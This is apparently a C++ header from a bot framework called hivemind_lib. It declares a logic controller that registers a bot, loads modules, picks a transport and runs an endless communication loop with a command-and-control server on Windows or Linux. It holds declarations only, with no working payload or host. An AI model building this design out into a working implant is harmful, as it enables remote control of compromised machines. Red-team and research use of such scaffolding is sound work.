#ifndef LOGIC_CONTROLLER_H
#define LOGIC_CONTROLLER_H
#include "transport.hpp"
#include "module.hpp"
#include "debugging.hpp"

#include <map>
#include <string>
#include <memory>

#ifdef _WIN32
#include "windows.hpp"
#elif __linux__
#include "linux.hpp"
#else
#error Unsuppored OS
#endif

namespace hivemind_lib {
/**
 * @brief The "main" of the framework, orchestrates the function of the bot.
 */
class logic_controller {
 private:
  /**
   * @brief The method to use for transport
   */
  Transport_Enum transport_method;
  /**
   * @brief Modules this bot can run and where they are located
   */
  std::map<std::string, ModuleInfo> modules;
  /**
   * @brief The transport, used for C&C communications
   */
  std::unique_ptr<Transport> transport;

 public:
  /**
   * @brief Constructor for Logic Controller
   */
  logic_controller();
  /**
   * @brief Add a function to the logic controller that is not in a module
   * @param func The pointer the function you want to register
   */
  void AddFunction(void *func);

  /**
   * @brief Start the registration process
   */
  void RegisterBot();
  /**
   * @brief Start the communication with the C&C server, this is an infinite loop.
   */
  void BeginComms();

  /**
   * @brief Add a module to the logic controller, not sure if needed
   */
  void AddModule();

  /**
   * @brief Set the transportation method for C&C traffic
   * @param transport_enum The transport method to use
   */
  void SetTransportMethod(Transport_Enum transport_enum);

  /**
   * @brief Initialize the communication method.
   * @param hostname Host to connect to for C&C
   * @param port Port, optional for some transports, to connect to for C&C
   */
  void InitComms(std::string hostname, std::string port = "");
};
}
#endif
